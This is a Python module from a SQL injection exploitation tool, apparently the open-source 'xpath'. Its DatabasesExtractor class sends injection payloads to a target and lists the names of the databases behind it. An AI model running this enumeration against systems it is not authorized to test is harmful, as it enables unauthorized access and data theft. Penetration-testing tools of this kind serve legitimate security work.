#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""

Author  : Nasir Khan (r0ot h3x49)
Github  : https://github.com/r0oth3x49
License : MIT


Copyright (c) 2016-2025 Nasir Khan (r0ot h3x49)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the
Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH 
THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""
from xpath.common.session import session
from xpath.injector.request import request
from xpath.logger.colored_logger import logger
from xpath.common.payloads import PAYLOADS_DBS_COUNT, PAYLOADS_DBS_NAMES
from xpath.common.lib import sqlite3, compat_urlencode, DBS_STATEMENT, collections
from xpath.common.utils import to_hex, prepare_payload_request, clean_up_offset_payload


class DatabasesExtractor(object):
    """
    Extract all databases names ..
    """

    def _generate_dbs_payloads(self, dbs_count, payload, index=0):
        payload = clean_up_offset_payload(payload)
        payloads = [payload.format(index=i) for i in range(index, dbs_count)]
        return payloads

    @property
    def _dbs_count(self):
        payloads = self._generat_payload(payloads_list=PAYLOADS_DBS_COUNT)
        return self._extact(payloads=payloads)

    @property
    def dbs_names(self):
        is_resumed = False
        index = 0
        fetched_data = {}
        _temp = []
        DatabasesResponse = collections.namedtuple(
            "DatabasesResponse", ["fetched", "count", "databases"]
        )
        try:
            fetched_data = session.fetch_from_table(
                session_filepath=self.session_filepath,
                table_name="tbl_databases",
                cursor=False,
            )
            if fetched_data:
                is_resumed = True
        except Exception as error:
            pass
        logger.info("fetching database names")
        retval = self._dbs_count
        if retval.is_injected:
            dbs_count = int(retval.result)
            if dbs_count != 0:
                logger.info("used SQL query returns %d entries" % (dbs_count))
            if dbs_count == 0:
                logger.warning("used SQL query returns %d entries for database names.." % (dbs_count))
                return DatabasesResponse(
                        fetched=False, count=dbs_count, databases=[]
                    )
            if is_resumed:
                for entry in fetched_data:
                    name = entry.get("dbname")
                    if name not in _temp:
                        _temp.append(name)
                    # logger.info(f"resumed: '{name}'")
                    index += 1
            should_fetch = True
            if is_resumed:
                if len(fetched_data) == dbs_count:
                    should_fetch = False
            if should_fetch:
                payloads = self._generat_payload(payloads_list=PAYLOADS_DBS_NAMES)
                retval = self._extact(payloads=payloads)
                if retval.is_injected:
                    payload = retval.payload
                    payloads = self._generate_dbs_payloads(
                        dbs_count=dbs_count, payload=payload, index=index
                    )
                    response_data = self._extract_dbs(payloads=payloads)
                    if response_data.is_fetched:
                        _temp.extend(response_data.result)
                    self._available_dbs(dbs_count, _temp)
                    return DatabasesResponse(
                        fetched=True, count=dbs_count, databases=_temp
                    )
                if not retval.is_injected:
                    status_code = retval.status_code
                    error = retval.error
                    count = retval.payloads_count
                    if status_code not in [200, 0]:
                        message = f"{error} - {count} times"
                        logger.warning(
                            f"HTTP error codes detected during run:\n{message}"
                        )
                    else:
                        message = f"tested with '{count}' queries, unable to find working SQL query."
                        logger.critical(message)
            else:
                self._available_dbs(dbs_count, _temp)
                return DatabasesResponse(fetched=True, count=dbs_count, databases=_temp)
        if not retval.is_injected:
            status_code = retval.status_code
            error = retval.error
            count = retval.payloads_count
            if status_code not in [200, 0]:
                message = f"{error} - {count} times"
                logger.warning(f"HTTP error codes detected during run:\n{message}")
            else:
                message = (
                    f"tested with '{count}' queries, unable to find working SQL query."
                )
                logger.critical(message)
        return DatabasesResponse(fetched=False, count=0, databases=_temp)

    def _available_dbs(self, count, databases):
        logger.success(f"available databases [{count}]:")
        for db in databases:
            logger.success(f"[*] {db}")

    def _extract_dbs(self, payloads):
        _temp, index = [], 0
        Response = collections.namedtuple("Response", ["is_fetched", "result"])

        while index < len(payloads):
            payload = payloads[index]
            payload_request = prepare_payload_request(self, payload)
            url = payload_request.url
            data = payload_request.data
            regex = payload_request.regex
            headers = payload_request.headers
            try:
                response = request.inject_payload(
                    url=url, regex=regex, data=data, headers=headers, proxy=self._proxy
                )
            except KeyboardInterrupt:
                logger.warning(
                    "user aborted during enumeration. Xpath will display partial output"
                )
                break
            else:
                if response.ok:
                    result = response.result
                    logger.info("retrieved: '%s'" % (result))
                    _temp.append(result)
                    _ = session.dump(
                        session_filepath=self.session_filepath,
                        query=DBS_STATEMENT.format(dbname=result),
                    )
                index += 1

        if _temp and len(_temp) > 0:
            _temp = list(set(_temp))
            resp = Response(is_fetched=True, result=_temp)
        else:
            resp = Response(is_fetched=True, result=_temp)
        return resp
